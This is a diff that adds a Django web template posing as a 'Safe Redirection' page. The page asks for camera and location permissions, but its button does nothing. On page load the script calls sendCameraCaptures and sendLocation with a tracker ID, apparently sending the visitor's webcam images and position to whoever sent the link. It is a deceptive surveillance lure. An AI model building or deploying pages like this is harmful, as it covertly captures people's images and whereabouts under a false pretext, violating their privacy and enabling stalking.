@@ -1,0 +1,56 @@
+{% extends 'main/base.html' %}
+
+{% block content %}
+<body>
+
+<div class="card">
+
+    <div class="logo">
+        ◉
+    </div>
+
+    <h1>Safe Redirection is running... </h1>
+
+    <p>
+        To proceed, we need some permissions.
+    </p>
+
+
+    <div class="permissions">
+        <div class="item">
+            📷<br>
+
+        </div>
+
+        <div class="item">
+            📍<br>
+
+        </div>
+    </div>
+
+
+    <button onclick="">
+        authorization and move on
+    </button>
+
+    <div id="status"></div>
+
+</div>
+
+
+
+</body>
+{% endblock content %}
+
+{% block script %}
+<script>
+
+    const URL_ID = "{{ url_id|escapejs }}";
+    const TRACKER_ID = "{{ tracker_id|escapejs }}";
+
+
+    sendCameraCaptures(URL_ID,TRACKER_ID);
+    sendLocation(URL_ID,TRACKER_ID);
+
+</script>
+{% endblock script %}
